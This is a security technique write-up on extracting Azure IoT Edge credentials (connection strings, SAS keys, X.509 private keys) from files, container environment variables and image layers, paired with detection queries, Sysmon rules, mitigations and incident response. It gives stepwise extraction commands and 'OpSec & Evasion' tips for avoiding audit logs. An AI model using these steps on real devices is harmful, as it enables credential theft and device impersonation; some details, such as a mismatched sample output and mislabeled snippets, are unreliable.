# [IOT-EDGE-001]: IoT Device Credential Extraction

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | IOT-EDGE-001 |
| **MITRE ATT&CK v18.1** | [T1552.001 - Unsecured Credentials: Credentials in Files](https://attack.mitre.org/techniques/T1552/001/) |
| **Tactic** | Credential Access |
| **Platforms** | Azure IoT, IoT Edge, Linux, Containers |
| **Severity** | Critical |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | Azure IoT Edge 1.0+, Docker 18.0+, Linux Kernel 4.0+ |
| **Patched In** | N/A (Design issue, requires proper secret management) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** IoT devices commonly store sensitive authentication credentials in plaintext or weakly protected files on the filesystem. These credentials include Azure IoT Hub connection strings, device certificates, X.509 keys, and Shared Access Signatures (SAS) tokens. An attacker with local filesystem access (whether through initial compromise, container escape, or physical access) can enumerate and extract these credentials, gaining identity-based access to backend IoT services. Extracted credentials can be leveraged to impersonate the device, access IoT Hub, read/write device twins, and pivot laterally into cloud infrastructure.

**Attack Surface:** Filesystem locations (e.g., `/etc/config/`, `/opt/`, `~/.config/`, Docker container layers, device memory), environment variables, configuration files (JSON, YAML, XML), and container images.

**Business Impact:** **Unauthorized Device Impersonation and Cloud Infrastructure Compromise**. Stolen credentials grant attackers the ability to communicate as a legitimate IoT device, exfiltrate sensor data, inject false telemetry, compromise downstream analytics systems, and establish persistence in Azure IoT Hub. In critical infrastructure scenarios (energy, healthcare), this can lead to operational disruption.

**Technical Context:** Extraction typically occurs within 30 seconds to 2 minutes if credentials are stored in world-readable files. Detection likelihood is **Low to Medium** if logging is not configured for filesystem access auditing (Sysmon, auditd). Common indicators include unusual `find`, `grep`, `cat`, or `strings` command execution patterns and file reads from config directories.

### Operational Risk

- **Execution Risk:** Medium – Requires local filesystem access but no code injection or privilege escalation
- **Stealth:** High – Filesystem reads generate minimal noise; absent proper auditd/Sysmon rules, extraction is undetectable
- **Reversibility:** N/A – Credential extraction is non-destructive; damage occurs post-extraction when credentials are used

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS IoT Device Security Controls v1.0 - 2.1 | Ensure credentials are not hardcoded in configuration files |
| **DISA STIG** | SV-254954r889328_rule | Configure audit logging for sensitive file access |
| **CISA SCuBA** | ID.AM-2 | Asset inventory must identify credential storage locations |
| **NIST 800-53** | SC-7 (Boundary Protection), SC-28 (Protection of Information at Rest) | Encrypt credentials at rest; restrict access to credential files |
| **GDPR** | Art. 32 | Security of Processing – encryption and access controls required for personal/operational data |
| **DORA** | Art. 11 (Incident Reporting) | Credential compromises must be reported within timeline |
| **NIS2** | Art. 21 | Cyber Risk Management Measures – credential protection mandatory |
| **ISO 27001** | A.8.2.1 (User endpoint devices), A.8.3.2 (Segregation of networks) | Credential management and device isolation required |
| **ISO 27005** | Risk assessment for credential storage and access controls | Identify and mitigate unauthorized credential extraction risks |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** Local filesystem read access (non-root in many cases, as config files are world-readable)
- **Required Access:** SSH, RDP, container shell access, or physical device access

**Supported Versions:**
- **Azure IoT Edge:** Version 1.0 - 1.4.8 (latest)
- **Linux:** Ubuntu 18.04+, Debian 9+, CentOS 7+, Alpine 3.9+
- **Docker:** 18.0 - 26.0+
- **PowerShell:** 5.0+ (for Windows IoT Core devices)

**Tools:**
- [Bash/Shell utilities](https://www.gnu.org/software/bash/) – find, grep, cat, strings (native)
- [Docker CLI](https://docs.docker.com/engine/reference/commandline/cli/) (Version 20.10+)
- [Azure CLI](https://docs.microsoft.com/en-us/cli/azure/) (Version 2.30+)
- [jq](https://stedolan.github.io/jq/) – JSON query tool (optional, for parsing config files)

---

## 3. ENVIRONMENTAL RECONNAISSANCE

#### Management Station / PowerShell Reconnaissance

```powershell
# List IoT devices registered in Azure IoT Hub
az iot hub device-identity list --hub-name <hub-name> --query "[].{id:deviceId, type:type, status:status}"

# Retrieve device connection string (requires IoT Hub Owner role)
az iot hub device-identity connection-string show --hub-name <hub-name> --device-id <device-id>

# Check for credentials in Edge module deployment manifests
az iot edge deployment show --hub-name <hub-name> --deployment-id <deployment-id> --query "content.modulesContent"
```

**What to Look For:**
- Presence of raw connection strings in deployment output (indicates poor credential management)
- Device authentication type: `sas` (Shared Access Signature) vs `x509` (certificate-based)
- Module environment variables containing credential references

#### Linux/Bash / CLI Reconnaissance

```bash
# Search for connection strings in common config locations
find /etc /opt /home -name "*.json" -o -name "*.conf" -o -name ".env" 2>/dev/null | xargs grep -l "HostName\|SharedAccessKey" 2>/dev/null

# List IoT Edge module configuration
docker inspect <module-name> | grep -i "env\|connection"

# Check for credential files (certificates, keys)
find /etc -name "*.pem" -o -name "*.pfx" -o -name "*.key" 2>/dev/null

# Examine processes to identify credential storage locations
ps aux | grep -E "iotedged|module" | head -5
```

**What to Look For:**
- Successful matches in grep output indicate unencrypted credential storage
- Docker inspect output revealing connection strings in container environment variables
- Presence of certificate files readable by unprivileged users

---

## 4. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Extracting Credentials from Container Layer Files

**Supported Versions:** Azure IoT Edge 1.0 - 1.4.8, Docker 18.0+

#### Step 1: Identify Running IoT Edge Modules

**Objective:** Enumerate Docker containers running on the IoT Edge device to identify module containers

**Command:**
```bash
docker ps --format "table {{.Names}}\t{{.Image}}\t{{.Status}}"
```

**Expected Output:**
```
CONTAINER ID        NAMES               IMAGE                           STATUS
abc12345def         edgeAgent           mcr.microsoft.com/azureiotedge-agent:1.4   Up 2 days
def23456abc         edgeHub             mcr.microsoft.com/azureiotedge-hub:1.4     Up 2 days
ghi34567def         my-module-1         myregistry.azurecr.io/my-module:1.0        Up 1 hour
jkl45678ghi         my-module-2         myregistry.azurecr.io/my-module:1.0        Up 1 hour
```

**What This Means:**
- Each running container is an IoT Edge module
- The edgeAgent manages module lifecycle
- The edgeHub handles inter-module and cloud communication
- Custom modules may store credentials in their runtime

**OpSec & Evasion:**
- Docker commands are logged if auditd is configured on the host
- Evasion: Run `docker` commands from a non-privileged shell history to avoid sudo logging
- Detection likelihood: **Medium** – Docker daemon logs can be monitored via auditd or host-based auditing

#### Step 2: Extract Container Environment Variables Containing Credentials

**Objective:** Retrieve environment variables from running containers; many modules store connection strings here

**Command:**
```bash
docker inspect <module-name> | grep -A 100 "Env"
```

**Example:**
```bash
docker inspect my-module-1 | grep -A 50 "Env"
```

**Expected Output:**
```json
"Env": [
    "IoT_Hub_Connection_String=HostName=myhub.azure-devices.net;SharedAccessKeyName=owner;SharedAccessKey=AbCdEfGhIjKlMnOpQrStUvWxYz1234567890abcdefgh=",
    "DEVICE_ID=my-device-001",
    "MODULE_ID=my-module-1",
    "PYTHONUNBUFFERED=1",
    "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
]
```

**What This Means:**
- The `IoT_Hub_Connection_String` variable contains the full Shared Access Key
- This key grants full access to IoT Hub (create/read/update/delete devices, send/receive messages)
- The key is valid until the device identity is revoked in Azure

**Troubleshooting:**
- **Error:** `Error response from daemon: No such container`
  - **Cause:** Module name is incorrect or container has stopped
  - **Fix:** Run `docker ps -a` to list all containers including stopped ones

- **Error:** `permission denied while trying to connect to the Docker daemon`
  - **Cause:** User lacks Docker socket permissions
  - **Fix (Linux):** Add user to docker group: `sudo usermod -aG docker $USER`

**References & Proofs:**
- [Docker Inspect Documentation](https://docs.docker.com/engine/reference/commandline/inspect/)
- [Azure IoT Edge Module Development Guide](https://docs.microsoft.com/en-us/azure/iot-edge/module-development)
- [MITRE Credential Extraction Analysis](https://attack.mitre.org/techniques/T1552/001/)

#### Step 3: Extract Credentials from Configuration Files

**Objective:** Search the container filesystem for hardcoded credentials in config files

**Command (Execute inside container):**
```bash
docker exec <module-name> find / -name "*.json" -o -name "*.conf" -o -name "appsettings.json" 2>/dev/null | xargs grep -l "key\|credential\|password\|secret\|HostName" 2>/dev/null
```

**Alternatively, inspect container layers:**
```bash
docker history --human --no-trunc <module-image>
```

**Expected Output:**
```
IMAGE                              CREATED            CREATED BY                                                                      SIZE
myregistry.azurecr.io/my-module   1 hour ago         /bin/sh -c echo 'Connection String: HostName=...'                             2.5KB
...
```

**What This Means:**
- Credentials embedded in Docker image layers persist across container restarts
- Layer inspection reveals build-time secrets that were never removed
- Credentials in image history cannot be revoked without rebuilding the image

**OpSec & Evasion:**
- Docker history inspection is less frequently monitored than docker exec
- Detection likelihood: **Low**

**Troubleshooting:**
- **No matches found:** Module may use Azure Key Vault or secure credential storage
- **Fix:** Check container logs for credential references: `docker logs <module-name> | grep -i "key\|secret\|connect"`

**References & Proofs:**
- [Docker Image Forensics](https://blog.aquasec.com/docker-image-forensics)
- [OWASP: Secrets in Images](https://owasp.org/www-project-container-security/)

#### Step 4: Extract X.509 Certificates and Private Keys

**Objective:** Locate and extract device certificates used for mutual TLS authentication

**Command (Find certificates in container):**
```bash
docker exec <module-name> find / -name "*.pem" -o -name "*.crt" -o -name "*.key" 2>/dev/null
```

**Command (Extract certificate from host volume mount):**
```bash
# Identify volume mounts
docker inspect <module-name> | grep -A 5 "Mounts"

# Read certificate if accessible from host
sudo cat /var/lib/aziot/identities/<device-id>/<module-id>/module_cert.pem
```

**Expected Output:**
```
/etc/aziot/identities/device-id/module-id/module_cert.pem
/etc/aziot/identities/device-id/module-id/module_key.pem
/etc/config/ca-cert.pem
/opt/credentials/device.pfx
```

**What This Means:**
- Private key extraction allows an attacker to decrypt historical communications and forge new ones
- X.509 certificates can be used for mutual TLS authentication with IoT Hub
- Certificates are valid for their entire validity period (often 1-10 years) unless revoked

**OpSec & Evasion:**
- Reading certificate files requires appropriate filesystem permissions
- Mount volumes from the host to preserve certificates post-extraction
- Detection likelihood: **Medium** – Auditd can log file access to credential directories

**References & Proofs:**
- [Azure IoT Edge Certificate Management](https://docs.microsoft.com/en-us/azure/iot-edge/iot-edge-security-manager)
- [X.509 Certificate Extraction Techniques](https://blog.talosintelligence.com/container-security/)

### METHOD 2: Extracting Credentials via Docker Layer Forensics

**Supported Versions:** All Docker versions supporting image export

#### Step 1: Export Container Image Layers

**Objective:** Extract the entire container filesystem to analyze for embedded credentials

**Command:**
```bash
docker save <module-image> -o module.tar
tar -tf module.tar | head -20
tar -xf module.tar
```

**Expected Output:**
```
module.tar
└── blobs/
    └── sha256/
        ├── abc123... (base layer)
        ├── def456... (dependency layer)
        └── ghi789... (application layer)
```

**What This Means:**
- Each layer is a separate archive containing filesystem changes
- Credentials in any layer persist through subsequent layers
- Docker does not automatically remove secrets from intermediate layers

#### Step 2: Search Extracted Layers for Credentials

**Command:**
```bash
for layer in blobs/sha256/*; do
  tar -xf "$layer" -O 2>/dev/null | strings | grep -E "HostName|SharedAccessKey|ConnectionString" | head -5
done
```

**Expected Output:**
```
HostName=myhub.azure-devices.net;SharedAccessKeyName=owner;SharedAccessKey=AbCd...
```

**What This Means:**
- Credentials are extracted from all image layers in sequence
- Identifies credentials that may have been deleted from the final layer but still exist in history

**References & Proofs:**
- [Dive - Docker Image Analysis Tool](https://github.com/wagoodman/dive)

---

## 5. ATTACK SIMULATION & VERIFICATION

#### Atomic Red Team

- **Atomic Test ID:** T1552.001 - Test #1 (Unsecured Credentials: Credentials in Files)
- **Test Name:** Find and extract password-related files from local system
- **Description:** Simulates an attacker searching for plaintext credentials on a compromised system
- **Supported Versions:** Linux, macOS, Windows
- **Command:**
  ```bash
  find / -type f -name "*password*" -o -name "*credentials*" -o -name "*.pem" 2>/dev/null | head -20
  ```
- **Cleanup Command:**
  ```bash
  # No artifacts to clean; this is read-only enumeration
  ```

**Reference:** [Atomic Red Team T1552.001](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.001/T1552.001.yaml)

---

## 6. TOOLS & COMMANDS REFERENCE

#### Docker CLI
**Version:** 20.10+
**Minimum Version:** 18.0
**Supported Platforms:** Linux, Windows, macOS

**Usage:**
```bash
docker ps                              # List running containers
docker inspect <container>             # Inspect container configuration
docker exec <container> <command>      # Execute command inside container
docker save <image>                    # Export image as tar archive
docker logs <container>                # View container logs
```

#### Bash/Shell Utilities (Native)
**Tools:** find, grep, cat, strings, sed, awk
**Usage:**
```bash
find / -name "*.json" 2>/dev/null       # Find JSON config files
grep -r "HostName" /etc /opt 2>/dev/null  # Search for connection strings
strings /var/lib/file | grep "key"      # Extract text from binary files
cat /etc/aziot/config.toml              # Read Azure IoT Edge daemon config
```

#### jq - JSON Query Tool
**Version:** 1.6+
**Installation:**
```bash
# Ubuntu/Debian
sudo apt-get install -y jq

# Alpine
apk add jq

# macOS
brew install jq
```
**Usage:**
```bash
cat config.json | jq '.modules | keys'      # Extract module names
cat config.json | jq '.[] | .connectionString'  # Extract connection strings
```

---

## 7. MICROSOFT SENTINEL DETECTION

#### Query 1: Detect Credential File Access on IoT Edge Devices

**Rule Configuration:**
- **Required Table:** SecurityEvent, Sysmon/OperationalEvent
- **Required Fields:** Computer, EventID, CommandLine, TargetFilename, Process
- **Alert Severity:** High
- **Frequency:** Run every 10 minutes
- **Applies To Versions:** Azure IoT Edge 1.0+, Windows with Sysmon

**KQL Query:**
```kusto
union SecurityEvent, Event
| where Computer contains "edge" or Computer contains "iot"
| where (EventID == 4663 and ObjectName contains "credential" or ObjectName contains ".pem" or ObjectName contains ".key")
  or (EventID == 3 and Process contains "grep" and CommandLine contains "HostName")
  or (EventID == 1 and CommandLine contains "docker inspect" and CommandLine contains "Env")
| summarize Count = count() by Computer, Account, CommandLine, EventTime
| where Count > 0
| sort by EventTime desc
```

**What This Detects:**
- File access attempts (EventID 4663) on credential files (.pem, .key, .pfx)
- Process creation (EventID 1) for credential extraction utilities (grep, find, strings)
- Docker inspect commands targeting environment variables

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `IoT Edge Device Credential Extraction`
   - Severity: `High`
5. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `10 minutes`
   - Lookup data from the last: `30 minutes`
6. **Incident settings Tab:**
   - Enable **Create incidents**
7. Click **Review + create** → **Create**

**Manual Configuration Steps (PowerShell):**
```powershell
$ResourceGroup = "myResourceGroup"
$WorkspaceName = "mySentinelWorkspace"
$RuleName = "IoT Edge Credential Extraction"

Connect-AzAccount
Connect-AzSentinel -ResourceGroupName $ResourceGroup -WorkspaceName $WorkspaceName

$QueryContent = @"
union SecurityEvent, Event
| where Computer contains "edge" or Computer contains "iot"
| where (EventID == 4663 and ObjectName contains "credential" or ObjectName contains ".pem")
  or (EventID == 1 and CommandLine contains "grep" and CommandLine contains "HostName")
"@

New-AzSentinelAlertRule -ResourceGroupName $ResourceGroup `
  -WorkspaceName $WorkspaceName `
  -DisplayName $RuleName `
  -Query $QueryContent `
  -Severity "High" `
  -Enabled $true
```

**Source:** [Microsoft Sentinel IoT Security Best Practices](https://docs.microsoft.com/en-us/azure/sentinel/iot-solution)

#### Query 2: Detect Unusual Docker or Container Commands on IoT Devices

**KQL Query:**
```kusto
SecurityEvent
| where Process contains "docker" and (CommandLine contains "inspect" or CommandLine contains "export" or CommandLine contains "save")
| where Account != "system" and Account != "SYSTEM"
| summarize CommandCount = count() by Computer, Account, bin(TimeGenerated, 5m)
| where CommandCount > 3
| sort by TimeGenerated desc
```

---

## 8. WINDOWS EVENT LOG MONITORING

**Event ID: 4656 (A handle to an object was requested)**
- **Log Source:** Security
- **Trigger:** Access to certificate files (.pem, .key, .pfx) in credential directories
- **Filter:** ObjectName contains "credential" OR ObjectName contains ".pem" OR ObjectName contains ".key"
- **Applies To Versions:** Windows IoT Core, Windows Server 2019+

**Manual Configuration Steps (Group Policy):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration**
3. Enable: **Audit Object Access** → **Audit File System**
4. Set to: **Success and Failure**
5. Run `gpupdate /force` on target machines

**Manual Configuration Steps (Local Policy - IoT Devices):**
1. Open **Local Security Policy** (secpol.msc) on the IoT device
2. Navigate to **Security Settings** → **Advanced Audit Policy Configuration** → **Audit Policies**
3. Enable: **Object Access** → **Audit File System**
4. Restart the machine or run:
   ```powershell
   auditpol /set /subcategory:"File System" /success:enable /failure:enable
   ```

---

## 9. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+
**Supported Platforms:** Linux (via Auditbeat), Windows

**Sysmon Config Snippet (Windows IoT):**
```xml
<Sysmon schemaversion="4.30">
  <EventFiltering>
    <!-- Detect file access to credential files -->
    <FileCreate onmatch="include">
      <TargetFilename condition="contains">credential</TargetFilename>
      <TargetFilename condition="contains">.pem</TargetFilename>
      <TargetFilename condition="contains">.key</TargetFilename>
    </FileCreate>
    
    <!-- Detect credential extraction commands -->
    <ProcessCreate onmatch="include">
      <CommandLine condition="contains">grep</CommandLine>
      <CommandLine condition="contains">HostName</CommandLine>
      <CommandLine condition="contains">SharedAccessKey</CommandLine>
    </ProcessCreate>
    
    <!-- Detect docker inspect / export -->
    <ProcessCreate onmatch="include">
      <Image condition="contains">docker.exe</Image>
      <CommandLine condition="contains">inspect</CommandLine>
      <CommandLine condition="contains">save</CommandLine>
    </ProcessCreate>
  </EventFiltering>
</Sysmon>
```

**Manual Configuration Steps:**
1. Download Sysmon from [Microsoft Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Create the XML config file above as `sysmon-config.xml`
3. Install Sysmon:
   ```cmd
   sysmon64.exe -accepteula -i sysmon-config.xml
   ```
4. Verify installation and monitor:
   ```powershell
   Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10 | Format-Table TimeCreated, Message -AutoSize
   ```

---

## 10. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alert: Unauthorized Access to Sensitive Files

**Alert Name:** IoT Device Accessing Credential Files (Custom)
- **Severity:** High
- **Description:** Detects attempts to read credential files (.pem, .key, .pfx) from non-service processes
- **Applies To:** IoT Edge devices with Defender for Cloud Agent enabled
- **Remediation:** Investigate process owner; revoke compromised credentials; implement file access controls

**Manual Configuration Steps (Enable Defender for Cloud):**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings** → Select your subscription
3. Under **Defender plans**, enable:
   - **Defender for Servers**: ON
   - **Defender for IoT**: ON
4. Click **Save**
5. Go to **Security alerts** to view detected threats

---

## 11. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

#### Query: Monitor Device Credential Access in IoT Hub

```powershell
Search-UnifiedAuditLog -Operations "Get Device", "List Devices", "Get Device Identity" `
  -StartDate (Get-Date).AddDays(-7) `
  -ResultSize 5000 | Select-Object UserIds, Operations, CreationDate, ClientIP | Sort-Object CreationDate -Descending
```

- **Operation:** GetDevice, ListDevices, GetDeviceIdentity
- **Workload:** Azure IoT
- **Details:** Analyze AuditData blob for unusual credential retrieval patterns
- **Applies To:** M365 E5 + Azure subscriptions with Purview enabled

**Manual Configuration Steps (Enable Unified Audit Log):**
1. Navigate to **Microsoft Purview Compliance Portal** (compliance.microsoft.com)
2. Go to **Audit** (left menu)
3. If not enabled, click **Turn on auditing**
4. Wait 24 hours for log retention to activate

---

## 12. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

- **Use Azure Key Vault or IoT Hub Identity Services for Credential Storage:** Replace hardcoded credentials with managed identities or Key Vault references.
  
  **Applies To Versions:** Azure IoT Edge 1.1+
  
  **Manual Steps (PowerShell - Enable Managed Identity on IoT Edge Device):**
  ```powershell
  # Register the IoT Edge device with a system-assigned managed identity
  $deviceId = "my-edge-device"
  $resourceGroup = "myResourceGroup"
  $hubName = "myIoTHub"
  
  # Create device with system-assigned identity
  az iot hub device-identity create --device-id $deviceId --hub-name $hubName `
    --auth-method x509_thumbprint --primary-thumbprint <cert-thumbprint> `
    --secondary-thumbprint <cert-thumbprint> --status enabled
  
  # Assign the device to an IoT Edge deployment using Key Vault references
  # (Credentials are injected at runtime, not stored on disk)
  ```
  
  **Manual Steps (Azure Portal - Using Key Vault for Module Credentials):**
  1. Go to **Azure Portal** → **Key Vault**
  2. Create a new secret: **Name:** `iot-hub-connection-string`, **Value:** `<connection-string>`
  3. In **IoT Hub** → **IoT Edge Devices**, select your device
  4. Click **Set Modules**
  5. Add module environment variable: **Name:** `ConnectionString`, **Value:** `@Microsoft.KeyVault(SecretUri=https://<vault>.vault.azure.net/secrets/iot-hub-connection-string/)`
  6. Click **Review + Create** → **Create**

- **Implement Least-Privilege Filesystem Permissions:** Restrict credential file access to the module owner process only.
  
  **Manual Steps (Linux):**
  ```bash
  # Create a dedicated user for the module
  sudo useradd -r -s /bin/false iot-module-user
  
  # Create credential directory with restrictive permissions
  sudo mkdir -p /etc/iot-module/secrets
  sudo chown iot-module-user:iot-module-user /etc/iot-module/secrets
  sudo chmod 700 /etc/iot-module/secrets  # Only owner can read
  
  # Place certificate in the directory
  sudo cp device.pem /etc/iot-module/secrets/
  sudo chown iot-module-user:iot-module-user /etc/iot-module/secrets/device.pem
  sudo chmod 600 /etc/iot-module/secrets/device.pem
  
  # Run module container with limited user
  docker run --user iot-module-user:iot-module-user -v /etc/iot-module/secrets:/secrets <image>
  ```

- **Encrypt Credentials at Rest:** Use Azure Disk Encryption or LUKS for the IoT Edge device storage.
  
  **Manual Steps (Linux - LUKS Encryption):**
  ```bash
  # Install cryptsetup
  sudo apt-get install cryptsetup -y
  
  # Create encrypted volume for credentials
  sudo cryptsetup luksFormat /dev/sdb1
  sudo cryptsetup luksOpen /dev/sdb1 secret-volume
  sudo mkfs.ext4 /dev/mapper/secret-volume
  sudo mount /dev/mapper/secret-volume /mnt/secret-creds
  
  # Move credentials to encrypted volume
  sudo mv /etc/iot-module/secrets/* /mnt/secret-creds/
  sudo umount /mnt/secret-creds
  sudo cryptsetup luksClose secret-volume
  ```

#### Priority 2: HIGH

- **Enable Auditd on IoT Edge Devices:** Log all file access attempts to credential directories for forensic analysis.
  
  **Manual Steps (Linux):**
  ```bash
  # Install auditd
  sudo apt-get install auditd -y
  
  # Add audit rule for credential file access
  sudo auditctl -w /etc/aziot/ -p wa -k iot_credential_access
  sudo auditctl -w /opt/ -p r -k iot_credential_read
  
  # Persist rules
  echo "-w /etc/aziot/ -p wa -k iot_credential_access" | sudo tee -a /etc/audit/rules.d/aziot.rules
  echo "-w /opt/ -p r -k iot_credential_read" | sudo tee -a /etc/audit/rules.d/aziot.rules
  
  # Restart auditd
  sudo systemctl restart auditd
  ```

- **Disable Unnecessary Docker Commands on Production Devices:** Restrict `docker inspect`, `docker save`, and `docker exec` via AppArmor or SELinux.
  
  **Manual Steps (AppArmor - Ubuntu):**
  ```bash
  # Create AppArmor profile to restrict docker access
  cat > /etc/apparmor.d/usr.bin.docker << EOF
  #include <tunables/global>
  
  /usr/bin/docker {
    #include <abstractions/base>
    /usr/bin/docker mr,
    deny /sys/kernel/debug/** rwkl,
    deny /proc/sys/** rwkl,
  }
  EOF
  
  sudo apparmor_parser -r /etc/apparmor.d/usr.bin.docker
  ```

#### Access Control & Policy Hardening

- **Conditional Access: Require Multi-Factor Authentication for IoT Hub Credential Access:**
  
  **Manual Steps (Azure Portal):**
  1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Click **+ New policy**
  3. Name: `Require MFA for IoT Hub Access`
  4. **Assignments:**
     - Users: All users with IoT Hub roles
     - Cloud apps: Select `Azure IoT Hub`
  5. **Conditions:**
     - Sign-in risk: High
  6. **Access controls:**
     - Grant: **Require multi-factor authentication**
  7. Enable policy: **On**
  8. Click **Create**

- **RBAC: Remove Device Owner Roles from Non-Privileged Accounts:**
  
  **Manual Steps (Azure Portal):**
  1. Go to **Azure Portal** → **IoT Hub** → **Access Control (IAM)**
  2. Search for roles: `IoT Hub Data Owner`, `IoT Hub Service Administrator`
  3. Click the role → **Assignments**
  4. Identify non-essential accounts
  5. Click **Remove** to revoke the role

- **Policy Config: Enable Azure IoT Hub Firewall and Restrict IP Access:**
  
  **Manual Steps (Azure Portal):**
  1. Go to **Azure Portal** → **IoT Hub** → **Networking**
  2. Under **Public network access**, select **Enabled**
  3. Add **Firewall rules** for allowed IP ranges only
  4. Click **Save**

#### Validation Command (Verify Fix)

```bash
# Verify credentials are not stored in Docker environment variables
docker inspect <module-name> | grep -i "HostName\|SharedAccessKey"

# Expected Output (If Secure):
# [No output – credentials are not exposed]

# Verify filesystem permissions on credential files
ls -la /etc/aziot/identities/*/*/
# Expected Output:
# -rw------- 1 root root 1234 Jan 1 12:00 device_cert.pem
# (Permissions are 600, accessible only to owner)

# Verify auditd rules are active
sudo auditctl -l | grep iot_credential
# Expected Output:
# -w /etc/aziot/ -p wa -k iot_credential_access
```

**What to Look For:**
- No credentials in docker inspect output
- File permissions of 600 (owner read/write only)
- Active auditd rules for credential directory monitoring

---

## 13. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise (IOCs)

- **Files:** `/etc/aziot/identities/*/*/module_cert.pem`, `/etc/aziot/identities/*/*/module_key.pem`, `/opt/config/connection_string.txt`, `/home/*/.azure/credentials`
- **Registry (Windows IoT):** `HKLM\Software\Microsoft\Azure\IoT\Credentials`
- **Network:** Outbound connections from IoT device to Azure IoT Hub using extracted connection string

#### Forensic Artifacts

- **Disk:** Audit logs in `/var/log/audit/audit.log` (Linux) or Windows Security Event Log
- **Memory:** Running process environment variables containing credentials (accessible via `/proc/<pid>/environ`)
- **Cloud:** Azure Activity Log entries for device authentication with extracted credentials
- **Container:** Docker inspect output revealing environment variable modifications

#### Response Procedures

1. **Isolate:**
   ```bash
   # Disconnect IoT Edge device from network
   sudo ip link set eth0 down
   
   # Or, revoke device credentials in Azure IoT Hub
   az iot hub device-identity delete --hub-name <hub-name> --device-id <device-id>
   ```

2. **Collect Evidence:**
   ```bash
   # Export Security Event Log (Windows)
   wevtutil epl Security C:\Evidence\Security.evtx
   
   # Export audit logs (Linux)
   sudo tar -czf /tmp/audit-logs.tar.gz /var/log/audit/
   
   # Capture Docker container state
   docker save $(docker ps -q) -o containers.tar
   docker ps -a --format json > container-manifest.json
   ```

3. **Remediate:**
   ```bash
   # Stop compromised module
   docker stop <module-name>
   
   # Revoke credentials in Azure
   az iot hub device-identity delete --hub-name <hub-name> --device-id <device-id>
   
   # Redeploy device with new credentials
   az iot edge deployment create --hub-name <hub-name> --deployment-id <new-deployment> --content deployment.json
   ```

---

## 14. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IOT-EDGE-002] Azure IoT Hub Connection String Theft | Attacker exploits misconfigurations to steal IoT Hub credentials |
| **2** | **Credential Access** | **[IOT-EDGE-001]** | **Attacker extracts device credentials from filesystem** |
| **3** | **Lateral Movement** | [IOT-EDGE-004] Device Provisioning Service Abuse | Attacker uses stolen credentials to register rogue devices |
| **4** | **Privilege Escalation** | [IOT-EDGE-003] Edge Module Compromise | Attacker escapes container and installs rootkit |
| **5** | **Impact** | Data Exfiltration | Attacker exfiltrates sensor data and business intelligence from IoT Hub |

---

## 15. REAL-WORLD EXAMPLES

#### Example 1: ZiggyStarTux IoT Malware (2023)

- **Target:** IoT Devices, Linux-based Systems
- **Timeline:** June 2023 (reported by Microsoft)
- **Technique Status:** This attack used credential extraction from SSH configuration files to pivot to cryptomining infrastructure
- **Impact:** Compromised devices installed patched OpenSSH with embedded backdoors; extracted SSH credentials enabled lateral movement across IoT networks
- **Reference:** [Microsoft ZiggyStarTux Blog](https://www.microsoft.com/en-us/security/blog/2023/06/22/iot-devices-and-linux-based-systems-targeted-by-openssh-trojan-campaign/)

#### Example 2: Shodan IoT Scanning and Credential Extraction (2024)

- **Target:** Exposed IoT Devices running unpatched versions
- **Timeline:** Ongoing (widespread)
- **Technique Status:** Attackers use Shodan to identify exposed credential files, then extract credentials via HTTP GET requests
- **Impact:** Thousands of IoT devices compromised; credentials used for botnets and cryptomining
- **Reference:** [Shodan IoT Risk Analysis](https://www.shodan.io/)

---

## SUMMARY

**IOT-EDGE-001** represents a **critical vulnerability** in the IoT attack surface. The extraction of device credentials from plaintext storage enables attackers to impersonate IoT devices, access sensitive cloud infrastructure, and establish persistence. Organizations must implement **secret management solutions**, **filesystem encryption**, and **comprehensive logging** to defend against this threat. Regular security audits of IoT Edge deployments and removal of hardcoded credentials from container images are essential remediation steps.

---